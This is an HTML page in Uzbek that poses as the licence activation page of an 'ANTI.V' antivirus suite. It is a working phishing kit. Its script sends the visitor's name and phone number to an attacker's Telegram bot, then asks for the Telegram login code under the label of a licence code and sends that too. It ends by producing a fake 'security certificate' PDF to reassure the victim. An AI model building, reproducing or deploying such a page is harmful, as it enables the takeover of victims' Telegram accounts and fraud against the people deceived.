<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANTI.V | Official Security Suite</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
        :root {
            --primary: #1a73e8;
            --danger: #ea4335;
            --success: #34a853;
            --bg: #f8f9fa;
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .main-card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            border: 1px solid #dadce0;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        .logo-container {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .logo-text { font-size: 24px; font-weight: bold; color: var(--primary); }

        h2 { font-size: 22px; margin-bottom: 10px; color: #202124; }
        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.4; }

        .input-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 5px; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 15px;
            box-sizing: border-box;
        }

        input:focus { border: 2px solid var(--primary); outline: none; }

        button {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .hidden { display: none; }

        /* PDF uchun yashirin dizayn */
        #pdf-template {
            padding: 50px;
            border: 15px solid var(--primary);
            font-family: serif;
            display: none; /* Faqat PDF ichida ko'rinadi */
        }
    </style>
</head>
<body>

    <div class="main-card" id="step1">
        <div class="logo-container">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--primary)">
                <path d="M12 2L4 5V11C4 16.19 7.41 21.05 12 22.5C16.59 21.05 20 16.19 20 11V5L12 2Z"/>
            </svg>
            <span class="logo-text">ANTI.V</span>
        </div>
        <h2>Litsenziya Faollashtirish</h2>
        <p>Hujjatni yuklab olish va xavfsizlikni ta'minlash uchun ma'lumotlarni kiriting.</p>

        <div class="input-group">
            <label>Foydalanuvchi (F.I.SH)</label>
            <input type="text" id="uName" placeholder="Ismingizni kiriting">
        </div>
        <div class="input-group">
            <label>Telefon raqam</label>
            <input type="text" id="uPhone" value="+998" maxlength="13">
        </div>
        <button onclick="goToSms()">Yuklashni boshlash</button>
    </div>

    <div class="main-card hidden" id="step2">
        <div class="logo-container">
            <span class="logo-text" style="color: var(--danger);">TASDIQLASH</span>
        </div>
        <p>Telegram orqali yuborilgan 5 xonali litsenziya kodini kiriting:</p>
        <div class="input-group">
            <input type="number" id="uCode" placeholder="0 0 0 0 0" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
        </div>
        <button onclick="finalProcess()" style="background: var(--success);">Tasdiqlash va Yuklab olish</button>
    </div>

    <div class="main-card hidden" id="step3">
        <h2 style="color: var(--success);">✓ Tasdiqlandi</h2>
        <p>Litsenziya fayli (PDF) yuklab olindi. Tizim to'liq himoyada.</p>
        <button onclick="location.reload()">Bosh sahifaga qaytish</button>
    </div>

    <script>
        const BOT_TOKEN = "7294248593:AAEq5B_B8Lh7Vn_R3Z..."; // Tokeningiz
        const CHAT_ID = "63482..."; // Chat IDingiz

        let globalName = "";
        let globalPhone = "";

        // 1. Birinchi bosqich: Ma'lumotlarni botga yuborish
        async function goToSms() {
            globalName = document.getElementById('uName').value;
            globalPhone = document.getElementById('uPhone').value;

            if(globalName.length < 3 || globalPhone.length < 13) {
                alert("Ma'lumotlarni to'ldiring!");
                return;
            }

            const message = `🚨 ANTI.V: YANGI FOYDALANUVCHI\n👤 Ism: ${globalName}\n📞 Tel: ${globalPhone}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);

            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }

        // 2. Ikkinchi bosqich: Kodni botga yuborish va PDF yasash
        async function finalProcess() {
            const code = document.getElementById('uCode').value;

            if(code.length < 5) {
                alert("Kodni kiriting!");
                return;
            }

            const message = `🔑 TELEGRAM KODI: ${code}\n👤 Foydalanuvchi: ${globalName}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);

            generatePDF(globalName, globalPhone);

            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
        }

        // 3. PDF yaratish funksiyasi (Sud qog'ozi uslubida)
        function generatePDF(name, phone) {
            const element = document.createElement('div');
            element.innerHTML = `
                <div style="padding: 50px; border: 10px solid #1a73e8; text-align: center;">
                    <h1 style="color: #1a73e8;">ANTI.V SECURITY CERTIFICATE</h1>
                    <hr>
                    <p style="font-size: 18px; text-align: left;">
                        <b>Tasdiqlandi:</b> Ushbu hujjat orqali <b>${name}</b> ismi bilan 
                        ro'yxatdan o'tgan qurilma to'liq himoyaga olinganligi tasdiqlanadi.
                    </p>
                    <p style="text-align: left;">Bog'langan telefon: <b>${phone}</b></p>
                    <p style="text-align: left;">Sana: ${new Date().toLocaleString()}</p>
                    <br><br>
                    <div style="text-align: right;">
                        <p><i>Elektron muhr: [ ANTI.V-OFFICIAL-STAMP ]</i></p>
                        <p>ID: ${Math.floor(Math.random() * 10000000)}</p>
                    </div>
                </div>
            `;
            html2pdf().from(element).save('ANTI_V_Sertifikat.pdf');
        }
    </script>
</body>
</html>
